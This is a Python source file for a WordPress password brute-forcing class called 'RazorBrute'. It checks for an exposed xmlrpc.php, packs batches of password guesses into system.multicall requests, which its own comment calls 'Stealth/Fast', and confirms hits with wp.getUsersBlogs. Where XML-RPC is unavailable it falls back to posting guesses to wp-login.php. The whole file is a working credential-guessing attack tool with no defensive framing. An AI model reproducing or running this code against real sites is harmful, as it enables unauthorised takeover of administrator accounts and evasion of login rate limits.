import httpx
import xml.etree.ElementTree as ET
from typing import List, Dict

class RazorBrute:
    def __init__(self, requester):
        self.requester = requester

    async def check_xmlrpc(self, url: str) -> bool:
        """Check if XML-RPC is responding and has required methods."""
        xml_payload = """<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
        try:
            resp = await self.requester.fetch(f"{url.rstrip('/')}/xmlrpc.php", method="POST", data=xml_payload)
            return resp and resp.status_code == 200 and "wp.getUsersBlogs" in resp.text
        except:
            return False

    async def test_credential(self, url: str, username: str, password: str) -> bool:
        """Test a single pair of credentials."""
        xml_payload = f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{password}</value></param></params></methodCall>"""
        try:
            resp = await self.requester.fetch(f"{url.rstrip('/')}/xmlrpc.php", method="POST", data=xml_payload)
            if resp and ("isAdmin" in resp.text or "blogid" in resp.text):
                return True
            return False
        except:
            return False

    def build_multicall_payload(self, username: str, passwords: list[str]) -> str:
        """Build payload to check multiple passwords at once (Stealth/Fast)."""
        payload = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
        for pw in passwords:
            payload += f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>{username}</string></value><value><string>{pw}</string></value></data></array></value></member></struct></value>'
        payload += '</data></array></value></param></params></methodCall>'
        return payload

    async def brute_wp(self, url: str, username: str, password_list: list[str], batch_size: int = 10):
        """Perform brute force using multicall or single requests."""
        is_xmlrpc = await self.check_xmlrpc(url)
        xmlrpc_url = f"{url.rstrip('/')}/xmlrpc.php"
        
        if is_xmlrpc:
            # Use multicall for efficiency
            for i in range(0, len(password_list), batch_size):
                batch = password_list[i:i+batch_size]
                payload = self.build_multicall_payload(username, batch)
                resp = await self.requester.fetch(xmlrpc_url, method="POST", data=payload)
                
                if resp and resp.status_code == 200:
                    # Check which one succeeded in the multicall response
                    # Simplified: if any succeeded, we might need to find which one
                    # But for now, let's just detect success
                    if "isAdmin" in resp.text or "blogid" in resp.text:
                        # Find which one
                        for pw in batch:
                            if await self.test_credential(url, username, pw):
                                return pw
        else:
            # Fallback to wp-login.php (much slower, but more universal)
            login_url = f"{url.rstrip('/')}/wp-login.php"
            for pw in password_list:
                data = {
                    "log": username,
                    "pwd": pw,
                    "wp-submit": "Log In",
                    "redirect_to": f"{url.rstrip('/')}/wp-admin/",
                    "testcookie": "1"
                }
                resp = await self.requester.fetch(login_url, method="POST", data=data)
                if resp and (resp.status_code == 302 or "wp-admin" in resp.url):
                    return pw
        
        return None

